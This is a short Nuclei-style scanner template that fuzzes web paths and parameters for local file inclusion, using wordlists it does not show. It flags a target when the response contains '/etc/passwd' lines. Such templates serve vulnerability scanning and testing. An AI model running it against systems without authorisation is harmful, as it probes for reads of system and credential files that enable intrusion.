id: lfi-fuzz

info:
  name: LFI Fuzzing
  author: pikpikcu
  severity: critical
  tags: lfi,fuzz

requests:

  - raw:
      - |
        GET /{{path}}?{{param}}={{payload}} HTTP/1.1
        Host {{Hostname}}


    payloads:
      path: helpers/wordlists/path.txt
      param: helpers/wordlists/param.txt
      payload: helpers/wordlists/payload-lfi.txt

    attack: clusterbomb

    threads: 50
    stop-at-first-match: true
    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
